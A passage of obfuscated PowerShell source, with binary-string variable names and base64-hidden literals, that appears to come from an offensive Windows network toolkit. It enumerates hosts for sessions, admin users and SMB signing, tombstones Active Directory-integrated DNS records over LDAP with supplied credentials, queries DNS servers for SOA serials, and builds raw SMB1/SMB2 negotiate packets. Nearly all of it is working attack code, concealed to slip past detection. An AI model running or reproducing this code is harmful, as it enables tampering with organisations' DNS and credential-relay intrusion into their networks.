        if(${_01111001100111010} -and ${_01111001100111010} -isnot [Array]){${_01111001100111010} = @(${_01111001100111010})}
        ${00101011001000010} = New-Object PSObject
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGQAZQB4AA=='))) ${10001101011100010}.enumerate.Count
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name "IP" ${_01010101101100010}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABvAHMAdABuAGEAbQBlAA=='))) ${_00001010101100110}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABOAFMAIABEAG8AbQBhAGkAbgA='))) ${_10011000100101010}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBlAHQAQgBJAE8AUwAgAEQAbwBtAGEAaQBuAA=='))) ${_10000111000010100}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBzAA=='))) $Sessions
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgAgAFUAcwBlAHIAcwA='))) ${_00100011111011111}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgAgAEcAcgBvAHUAcABzAA=='))) ${_10011010010000101}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAdgBpAGwAZQBnAGUAZAA='))) ${_00001100111111000}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAGEAcgBlAHMA'))) ${_00111000111111110}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBlAHMAcwBpAG8AbgBzAA=='))) ${_10100000011010100}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAUwBlAHMAcwBpAG8AbgBzACAATQBhAHAAcABlAGQA'))) ${_10100110000001110}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsACAAVQBzAGUAcgBzAA=='))) ${_01111001100111010}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMgAuADEA'))) ${_10111010111010111}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBpAG4AZwA='))) ${_01011000111001010}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAIABTAGUAcgB2AGUAcgA='))) ${_01000101110000111}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABOAFMAIABSAGUAYwBvAHIAZAA='))) ${_01101010001110010}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAHYANgAgAE8AbgBsAHkA'))) ${_10100010110001101}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAZQBkAA=='))) ${_00110000101101110}
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHUAbQBlAHIAYQB0AGUA'))) $Enumerate
        Add-Member -InputObject ${00101011001000010} -MemberType NoteProperty -Name $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAZQA='))) ${_10110111010110100}
        return ${00101011001000010}
    }
    function _01110000000001101
    {
        param ([String]${_01011010011110011},[String]$username,[String]${_00001010101100110},[String]${_01010101101100010})
        if(${10001101011100010}.domain_mapping_table.${_01011010011110011})
        {
            $session = ($username + "@" + ${10001101011100010}.domain_mapping_table.${_01011010011110011}).ToUpper()
            ${01000011100011111} = (${_00001010101100110} + "." + ${10001101011100010}.domain_mapping_table.${_01011010011110011}).ToUpper()
        }
        else
        {
            $session = ${_01011010011110011} + "\" + $username
        }
        for(${10000101000101100} = 0;${10000101000101100} -lt ${10001101011100010}.enumerate.Count;${10000101000101100}++)
        {
            if(${10001101011100010}.enumerate[${10000101000101100}].Hostname -eq ${01000011100011111} -or ${10001101011100010}.enumerate[${10000101000101100}].IP -eq ${_01010101101100010})
            {
                if(!${10001101011100010}.enumerate[${10000101000101100}].Hostname)
                {
                    ${10001101011100010}.enumerate[${01100011000100110}].Hostname = ${01000011100011111}
                }
                [Array]${01011001011110011} = ${10001101011100010}.enumerate[${10000101000101100}].Sessions
                if(${10001101011100010}.domain_mapping_table.${_01011010011110011})
                {
                    for(${10010111010110000} = 0;${10010111010110000} -lt ${01011001011110011}.Count;${10010111010110000}++)
                    {
                        if(${01011001011110011}[${10010111010110000}] -like $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AMAAxADAAMQAxADAAMQAwADAAMQAxADEAMQAwADAAMQAxAH0AXAAqAA=='))))
                        {
                            ${01001111010100011} = (${01011001011110011}[${10010111010110000}].Split("\"))[1]
                            ${00111010010001110} = ${01001111010100011} + "@" + ${10001101011100010}.domain_mapping_table.${_01011010011110011}
                            ${01011001011110011}[${10010111010110000}] += ${00111010010001110}
                            ${10001101011100010}.enumerate[${10000101000101100}].Sessions = ${01011001011110011}
                        }
                    }
                }
                if(${01011001011110011} -notcontains $session)
                {
                    ${01011001011110011} += $session
                    ${10001101011100010}.enumerate[${10000101000101100}].Sessions = ${01011001011110011}
                }
                ${01110010010101010} = $true
                break
            }
        }
        if(!${01110010010101010})
        {
            ${10001101011100010}.enumerate.Add((_00000101010001111 -_01010101101100010 ${_01010101101100010} -_00001010101100110 ${01000011100011111} -Sessions $session)) > $null
        }
    }
}
${01001011001001101} =
{
    function _10010111000110100
    {
        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]${_01011010011110011},
            [parameter(Mandatory=$false)][String]${_00100100001011101},
            [parameter(Mandatory=$true)][String]${_01110110101001111},
            [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones")][String]${_00100110101010100} = "DomainDNSZones",
            [parameter(Mandatory=$false)][String]${_00010111101010000},
            [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]${_01000100111001111}
        )
        ${10001110110101101} = _00010011000000010 -_00100100001011101 ${_00100100001011101} -_00010111101010000 ${_00010111101010000}
        ${10000111111011010} = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0AJAB7AF8AMAAxADEAMQAwADEAMQAwADEAMAAxADAAMAAxADEAMQAxAH0ALABEAEMAPQAkAHsAXwAwADAAMAAxADAAMQAxADEAMQAwADEAMAAxADAAMAAwADAAfQAsAEMATgA9AE0AaQBjAHIAbwBzAG8AZgB0AEQATgBTACwARABDAD0AJAB7AF8AMAAwADEAMAAwADEAMQAwADEAMAAxADAAMQAwADEAMAAwAH0A')))
        ${00001111001101110} = ${_01011010011110011}.Split(".")
        foreach(${00110110001010111} in ${00001111001101110})
        {
            ${10000111111011010} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LABEAEMAPQAkAHsAMAAwADEAMQAwADEAMQAwADAAMAAxADAAMQAwADEAMQAxAH0A')))
        }
        if(${_01000100111001111})
        {
            ${01000000001011111} = New-Object System.DirectoryServices.DirectoryEntry($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAkAHsAXwAwADAAMQAwADAAMQAwADAAMAAwADEAMAAxADEAMQAwADEAfQAvACQAewAxADAAMAAwADAAMQAxADEAMQAxADEAMAAxADEAMAAxADAAfQA='))),${_01000100111001111}.UserName,${_01000100111001111}.GetNetworkCredential().Password)
        }
        else
        {
            ${01000000001011111} = New-Object System.DirectoryServices.DirectoryEntry $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUAA6AC8ALwAkAHsAXwAwADAAMQAwADAAMQAwADAAMAAwADEAMAAxADEAMQAwADEAfQAvACQAewAxADAAMAAwADAAMQAxADEAMQAxADEAMAAxADEAMAAxADAAfQA=')))
        }
        ${00101000011010110} = [Int64](([datetime]::UtcNow.Ticks)-(Get-Date $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAvADEALwAxADYAMAAxAA==')))).Ticks)
        ${00101000011010110} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${00101000011010110}))
        ${00101000011010110} = ${00101000011010110}.Split("-") | %{[System.Convert]::ToInt16($_,16)}
        [Byte[]]${10110001100000101} = 0x08,0x00,0x00,0x00,0x05,0x00,0x00,0x00 +
            ${10001110110101101}[0..3] +
            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
            ${00101000011010110}
        try
        {
            ${01000000001011111}.InvokeSet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAUgBlAGMAbwByAGQA'))),${10110001100000101})
            ${01000000001011111}.InvokeSet($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAVABvAG0AYgBzAHQAbwBuAGUAZAA='))),$true)
            ${01000000001011111}.SetInfo()
            ${10001101011100010}.output_queue.Add("[+] [$(Get-Date -format s)] ADIDNS node ${_01110110101001111} tombstoned in ${_00010111101010000}") > $null
        }
        catch
        {
            ${10000111101001011} = $_.Exception.Message
            ${10000111101001011} = ${10000111101001011} -replace "`n",""
            ${10001101011100010}.output_queue.Add("[!] [$(Get-Date -format s)] ${10000111101001011} $($_.InvocationInfo.Line.Trim())") > $null
        }
        if(${01000000001011111}.Path)
        {
            ${01000000001011111}.Close()
        }
    }
    function _00010011000000010
    {
        [CmdletBinding()]
        param
        (
            [parameter(Mandatory=$false)][String]${_00100100001011101},
            [parameter(Mandatory=$false)][String]${_00010111101010000}
        )
        ${_00010111101010000} = ${_00010111101010000}.ToLower()
        function _00110011110111001(${_01101001111100011})
        {
            [Array]::Reverse(${_01101001111100011})
            return [System.BitConverter]::ToUInt16(${_01101001111100011},0)
        }
        function _00110101111101011(${_01000000001011010})
        {
            foreach(${_01101001111100011} in ${_01000000001011010}.Values)
            {
                ${10000011010010110} += ${_01101001111100011}
            }
            return ${10000011010010110}
        }
        function _10111011100011100
        {
            param([Int]${_00000000001100111},[Int]${_10010010101001001}=1,[Int]${_10101110111000001}=255)
            [String]${10101110000010010} = [String](1..${_00000000001100111} | % {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0A'))) -f (Get-Random -Minimum ${_10010010101001001} -Maximum ${_10101110111000001})})
            [Byte[]]${10101110000010010} = ${10101110000010010}.Split(" ") | %{[Char][System.Convert]::ToInt16($_,16)}
            return ${10101110000010010}
        }
        function _00110010011011010
        {
            param([String]${_10101100010101000})
            ${00111100000111011} = ${_10101100010101000}.ToCharArray()
            [Array]${01001010100111101} = 0..(${00111100000111011}.Count - 1) | ? {${00111100000111011}[$_] -eq '.'}
            if(${01001010100111101}.Count -gt 0)
            {
                ${10000110001000011} = 0
                foreach(${10001011001001000} in ${01001010100111101})
                {
                    ${00100100000011000} = ${10001011001001000} - ${10000110001000011}
                    [Byte[]]${00010011101110111} += ${00100100000011000}
                    [Byte[]]${00010011101110111} += [System.Text.Encoding]::UTF8.GetBytes(${_10101100010101000}.Substring(${10000110001000011},${00100100000011000}))
                    ${10000110001000011} = ${10001011001001000} + 1
                }
                [Byte[]]${00010011101110111} += (${_10101100010101000}.Length - ${10000110001000011})
                [Byte[]]${00010011101110111} += [System.Text.Encoding]::UTF8.GetBytes(${_10101100010101000}.Substring(${10000110001000011}))
            }
            else
            {
                [Byte[]]${00010011101110111} = ${_10101100010101000}.Length
                [Byte[]]${00010011101110111} += [System.Text.Encoding]::UTF8.GetBytes(${_10101100010101000}.Substring(${10000110001000011}))
            }
            return ${00010011101110111}
        }
        function _10010100011011010
        {
            param([String]${_10101100010101000})
            [Byte[]]${00001101110101110} = 0x00,0x06
            [Byte[]]${_10101100010101000} = (_00110010011011010 ${_10101100010101000}) + 0x00
            [Byte[]]${_00000000001100111} = [System.BitConverter]::GetBytes(${_10101100010101000}.Count + 16)[1,0]
            [Byte[]]${01100011001100101} = _10111011100011100 2
            ${10000000010101101} = New-Object System.Collections.Specialized.OrderedDictionary
            ${10000000010101101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAG4AZwB0AGgA'))),${_00000000001100111})
            ${10000000010101101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGEAYwB0AGkAbwBuAEkARAA='))),${01100011001100101})
            ${10000000010101101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x01,0x00))
            ${10000000010101101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcwB0AGkAbwBuAHMA'))),[Byte[]](0x00,0x01))
            ${10000000010101101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAHMAdwBlAHIAUgBSAHMA'))),[Byte[]](0x00,0x00))
            ${10000000010101101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIAaQB0AHkAUgBSAHMA'))),[Byte[]](0x00,0x00))
            ${10000000010101101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAaQB0AGkAbwBuAGEAbABSAFIAcwA='))),[Byte[]](0x00,0x00))
            ${10000000010101101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgBpAGUAcwBfAE4AYQBtAGUA'))),${_10101100010101000})
            ${10000000010101101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgBpAGUAcwBfAFQAeQBwAGUA'))),${00001101110101110})
            ${10000000010101101}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UQB1AGUAcgBpAGUAcwBfAEMAbABhAHMAcwA='))),[Byte[]](0x00,0x01))
            return ${10000000010101101}
        }
        ${00110011110001010} = New-Object System.Net.Sockets.TCPClient
        ${00110011110001010}.Client.ReceiveTimeout = 3000
        try
        {
            ${00110011110001010}.Connect(${_00100100001011101},"53")
            ${00000100110001000} = ${00110011110001010}.GetStream()
            ${00011000000111100} = New-Object System.Byte[] 2048
            ${00011010010010011} = _10010100011011010 ${_00010111101010000}
            [Byte[]]${01101101101001110} = _00110101111101011 ${00011010010010011}
            ${00000100110001000}.Write(${01101101101001110},0,${01101101101001110}.Length) > $null
            ${00000100110001000}.Flush()   
            ${00000100110001000}.Read(${00011000000111100},0,${00011000000111100}.Length) > $null
            ${00110011110001010}.Close()
            ${00000100110001000}.Close()
            if(${00011000000111100}[9] -eq 0)
            {
                ${10001101011100010}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIAAkAHsAXwAwADAAMAAxADAAMQAxADEAMQAwADEAMAAxADAAMAAwADAAfQAgAFMATwBBACAAcgBlAGMAbwByAGQAIABuAG8AdAAgAGYAbwB1AG4AZAA=')))) > $null
            }
            else
            {
                ${01001001000010001} = [System.BitConverter]::ToString(${00011000000111100})
                ${01001001000010001} = ${01001001000010001} -replace "-",""
                ${10001101110100011} = ${01001001000010001}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwAwADAAQwAwADAAMAA2ADAAMAAwADEA'))))
                ${10001101110100011} = ${10001101110100011} / 2
                ${11000000110001100} = ${00011000000111100}[(${10001101110100011} + 10)..(${10001101110100011} + 11)]
                ${11000000110001100} = _00110011110111001 ${11000000110001100}
                [Byte[]]${10100110110000111} = ${00011000000111100}[(${10001101110100011} + ${11000000110001100} - 8)..(${10001101110100011} + ${11000000110001100} - 5)]
                ${10100010000001000} = [System.BitConverter]::ToUInt32(${10100110110000111}[3..0],0) + 1
                [Byte[]]${10011011110011111} = [System.BitConverter]::GetBytes(${10100010000001000})[0..3]
            }
        }
        catch
        {
            ${10001101011100010}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIAAkAHsAXwAwADAAMQAwADAAMQAwADAAMAAwADEAMAAxADEAMQAwADEAfQAgAGQAaQBkACAAbgBvAHQAIAByAGUAcwBwAG8AbgBkACAAbwBuACAAVABDAFAAIABwAG8AcgB0ACAANQAzAA==')))) > $null
        }
        return [Byte[]]${10011011110011111}
    }
}
${00101111010111000} =
{
    function _00110101111101011
    {
        param(${_01000000001011010})
        ForEach(${_01101001111100011} in ${_01000000001011010}.Values)
        {
            ${10000011010010110} += ${_01101001111100011}
        }
        return ${10000011010010110}
    }
    function _01110110101010101
    {
        ${_00111001000100100} = [System.Diagnostics.Process]::GetCurrentProcess() | select -expand id
        ${_00111001000100100} = [System.BitConverter]::ToString([System.BitConverter]::GetBytes(${_00111001000100100}))
        [Byte[]]${_00111001000100100} = ${_00111001000100100}.Split("-") | %{[Char][System.Convert]::ToInt16($_,16)}
        return ${_00111001000100100}
    }
    function _00111011110001101
    {
        param([Int]${_01110010011101000},[Int]${_01010101111111000})
        [Byte[]]${_00000000001100111} = ([System.BitConverter]::GetBytes(${_01110010011101000} + ${_01010101111111000}))[2..0]
        ${01000001100111000} = New-Object System.Collections.Specialized.OrderedDictionary
        ${01000001100111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAHMAcwBhAGcAZQBUAHkAcABlAA=='))),[Byte[]](0x00))
        ${01000001100111000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABlAG4AZwB0AGgA'))),${_00000000001100111})
        return ${01000001100111000}
    }
    function _10000000011110000
    {
        param([Byte[]]$Command,[Byte[]]${_01010000101011010},[Byte[]]${_10001011010101111},[Byte[]]${_10000000001000011},[Byte[]]${_10000101001111101},[Byte[]]${_00111001100101101})
        ${_10000101001111101} = ${_10000101001111101}[0,1]
        ${01010110110100000} = New-Object System.Collections.Specialized.OrderedDictionary
        ${01010110110100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdABvAGMAbwBsAA=='))),[Byte[]](0xff,0x53,0x4d,0x42))
        ${01010110110100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBhAG4AZAA='))),$Command)
        ${01010110110100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAEMAbABhAHMAcwA='))),[Byte[]](0x00))
        ${01010110110100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00))
        ${01010110110100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByAEMAbwBkAGUA'))),[Byte[]](0x00,0x00))
        ${01010110110100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),${_01010000101011010})
        ${01010110110100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzADIA'))),${_10001011010101111})
        ${01010110110100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBJAEQASABpAGcAaAA='))),[Byte[]](0x00,0x00))
        ${01010110110100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${01010110110100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkADIA'))),[Byte[]](0x00,0x00))
        ${01010110110100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBJAEQA'))),${_10000000001000011})
        ${01010110110100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBJAEQA'))),${_10000101001111101})
        ${01010110110100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAEQA'))),${_00111001100101101})
        ${01010110110100000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQB1AGwAdABpAHAAbABlAHgASQBEAA=='))),[Byte[]](0x00,0x00))
        return ${01010110110100000}
    }
    function _10010110010001011
    {
        param([String]${_10101010000000101})
        if(${_10101010000000101} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMQA='))))
        {
            [Byte[]]${00100111011001101} = 0x0c,0x00
        }
        else
        {
            [Byte[]]${00100111011001101} = 0x22,0x00  
        }
        ${10100011011000010} = New-Object System.Collections.Specialized.OrderedDictionary
        ${10100011011000010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBvAHIAZABDAG8AdQBuAHQA'))),[Byte[]](0x00))
        ${10100011011000010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AHQAZQBDAG8AdQBuAHQA'))),${00100111011001101})
        ${10100011011000010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQARABpAGEAbABlAGMAdABzAF8ARABpAGEAbABlAGMAdABfAEIAdQBmAGYAZQByAEYAbwByAG0AYQB0AA=='))),[Byte[]](0x02))
        ${10100011011000010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQARABpAGEAbABlAGMAdABzAF8ARABpAGEAbABlAGMAdABfAE4AYQBtAGUA'))),[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))
        if(${_10101010000000101} -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAMQA='))))
        {
            ${10100011011000010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQARABpAGEAbABlAGMAdABzAF8ARABpAGEAbABlAGMAdABfAEIAdQBmAGYAZQByAEYAbwByAG0AYQB0ADIA'))),[Byte[]](0x02))
            ${10100011011000010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQARABpAGEAbABlAGMAdABzAF8ARABpAGEAbABlAGMAdABfAE4AYQBtAGUAMgA='))),[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
            ${10100011011000010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQARABpAGEAbABlAGMAdABzAF8ARABpAGEAbABlAGMAdABfAEIAdQBmAGYAZQByAEYAbwByAG0AYQB0ADMA'))),[Byte[]](0x02))
            ${10100011011000010}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHEAdQBlAHMAdABlAGQARABpAGEAbABlAGMAdABzAF8ARABpAGEAbABlAGMAdABfAE4AYQBtAGUAMwA='))),[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
        }
        return ${10100011011000010}
    }
    function _01101011100000110
    {
        param([Byte[]]$Command,[Byte[]]${_10100000110001011},[Bool]${_01011000111001010},[Int]${_01000111001011101},[Byte[]]${_10000101001111101},[Byte[]]${_10000000001000011},[Byte[]]${_00000101011101101})
        if(${_01011000111001010})
        {
            ${_01010000101011010} = 0x08,0x00,0x00,0x00      
        }
        else
        {
            ${_01010000101011010} = 0x00,0x00,0x00,0x00
        }
        [Byte[]]${10011111011010000} = [System.BitConverter]::GetBytes(${_01000111001011101})
        if(${10011111011010000}.Length -eq 4)
        {
            ${10011111011010000} += 0x00,0x00,0x00,0x00
        }
        ${00111011100100110} = New-Object System.Collections.Specialized.OrderedDictionary
        ${00111011100100110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AdABvAGMAbwBsAEkARAA='))),[Byte[]](0xfe,0x53,0x4d,0x42))
        ${00111011100100110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x40,0x00))
        ${00111011100100110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABpAHQAQwBoAGEAcgBnAGUA'))),[Byte[]](0x01,0x00))
        ${00111011100100110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAbgBuAGUAbABTAGUAcQB1AGUAbgBjAGUA'))),[Byte[]](0x00,0x00))
        ${00111011100100110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00))
        ${00111011100100110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AbQBhAG4AZAA='))),$Command)
        ${00111011100100110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABpAHQAUgBlAHEAdQBlAHMAdAA='))),${_10100000110001011})
        ${00111011100100110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),${_01010000101011010})
        ${00111011100100110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHgAdABDAG8AbQBtAGEAbgBkAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
        ${00111011100100110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAHMAcwBhAGcAZQBJAEQA'))),${10011111011010000})
        ${00111011100100110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBJAEQA'))),${_10000101001111101})
        ${00111011100100110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGUAZQBJAEQA'))),${_10000000001000011})
        ${00111011100100110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBJAEQA'))),${_00000101011101101})
        ${00111011100100110}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGcAbgBhAHQAdQByAGUA'))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        return ${00111011100100110}
    }
    function _00100101100101000
    {
        ${00001000111101100} = New-Object System.Collections.Specialized.OrderedDictionary
        ${00001000111101100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAdQBjAHQAdQByAGUAUwBpAHoAZQA='))),[Byte[]](0x24,0x00))
        ${00001000111101100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGEAbABlAGMAdABDAG8AdQBuAHQA'))),[Byte[]](0x02,0x00))
        ${00001000111101100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AbwBkAGUA'))),[Byte[]](0x01,0x00))
        ${00001000111101100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00))
        ${00001000111101100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAHAAYQBiAGkAbABpAHQAaQBlAHMA'))),[Byte[]](0x40,0x00,0x00,0x00))
        ${00001000111101100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBsAGkAZQBuAHQARwBVAEkARAA='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${00001000111101100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAQwBvAG4AdABlAHgAdABPAGYAZgBzAGUAdAA='))),[Byte[]](0x00,0x00,0x00,0x00))
        ${00001000111101100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUAQwBvAG4AdABlAHgAdABDAG8AdQBuAHQA'))),[Byte[]](0x00,0x00))
        ${00001000111101100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkADIA'))),[Byte[]](0x00,0x00))
